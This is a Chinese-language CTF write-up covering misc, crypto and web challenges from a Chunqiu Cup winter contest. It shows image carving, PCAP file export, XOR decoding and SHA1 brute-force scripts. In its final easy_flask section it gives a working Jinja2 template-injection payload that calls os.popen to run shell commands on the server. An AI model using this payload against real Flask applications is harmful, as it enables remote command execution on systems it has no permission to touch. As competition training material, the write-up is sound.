---
title: "ljnljn的春秋杯冬季赛wp（1.17）"
date: 2025-01-17 19:46:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "春秋杯"
cnblogs_postid: "18677584"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18677584"
---

## 杂项

### 1、See anything in these pics?

压缩包里有个码，确认是aztec码

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194150621-178418882.png)


这个是压缩包密码，解压出一张图片

binwalk找到多个图片，foremost分离

```
1:JPEG image data, JFIF standard 1.01
2:PNG image, 360 x 450, 8-bit grayscale, non-interlaced
3:TIFF image data, big-endian, offset of first image directory: 8
4:Zlib compressed data, best compression
```

分离后发现一张全黑照片，分析后发现crc校验不通过，修复高宽后得到最后的flag

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194201855-1401394963.png)


### 2、简单镜像提取

是一个流量文件，直接文件——导出对象，得到两个文件

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194212932-169218514.png)


其中一个有信息

```
9584上传文件名: please recovery.zip<br>文件类型: application/x-zip-compressed<br>文件大小: 9.359375 kB<br>文件临时存储的位置: C:\Users\Go up\AppData\Local\Temp\php48E.tmp<br>文件存储在: upload/please recovery.zip
```

推测另一个就是zip文件

zip文件打开后里面有个img文件，解压，随后用filelocator直接搜flag

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194404232-1712059589.png)


找到后提交不正确，原因是把末尾的7一起交了

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194412107-2086913979.png)


再交的时候成功

### 3、简单算术

根据题目提示用cyberchef解异或

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194416242-2047517985.png)


## 密码

### 1、你是小哈斯?

先用hashes网站尝试了一下，爆破出的基本都是一位字符的形式，猜测全是这样

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194431033-146131208.png)


于是写了爆破代码

```Python
import hashlib
results=[]

def crack_hash(target_hash):
    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;\':\",./<>?'
    for char in charset:
        hash_object = hashlib.sha1(char.encode())
        computed_hash = hash_object.hexdigest()
        if computed_hash == target_hash:
            return char
    return None


with open('hash.txt', 'r') as file:
    for line in file:
        target_hash = line.strip()
        result = crack_hash(target_hash)
        results.append(result)
        if result:
            print(f"哈希值 {target_hash} 匹配的字符: {result}")
            print("".join(results))

```

获得flag

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194440501-242586579.png)


### 2、通往哈希的旅程

查了一下是sha1形式

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194445059-473075864.png)


且已知一共11位，前3位是188，写脚本

```Python
import hashlib


def brute_force_sha1(hash_to_find):
    known_prefix = "188"
    for i in range(100000000):  
        test_string = known_prefix + "{:08d}".format(i)
        print("try:",test_string)
        sha1_hash = hashlib.sha1(test_string.encode()).hexdigest()
        if sha1_hash == hash_to_find:
            return test_string
    return None


target_hash = "ca12fd8250972ec363a16593356abb1f3cf3a16d"
original_text = brute_force_sha1(target_hash)
if original_text:
    print(f"找到匹配的原文: {original_text}")
else:
    print("未找到匹配的原文")
```

之后就能获得电话号码（爆破时间太长就不再爆破了）

## 网络安全

### 1、easy_flask

有个输入框，填一下flask常见漏洞

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194454668-996288659.png)


发现能运行

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194457746-2046930356.png)


填入```{{ config.__class__.__init__.__globals__['os'].popen('cd flag;cat flag').read() }}```

获得flag

![image](/assets/cnblogs/ljnljn的春秋杯冬季赛wp（1.17）/3539156-20250117194506313-1631831085.png)

（希望明天能写多点呜呜）
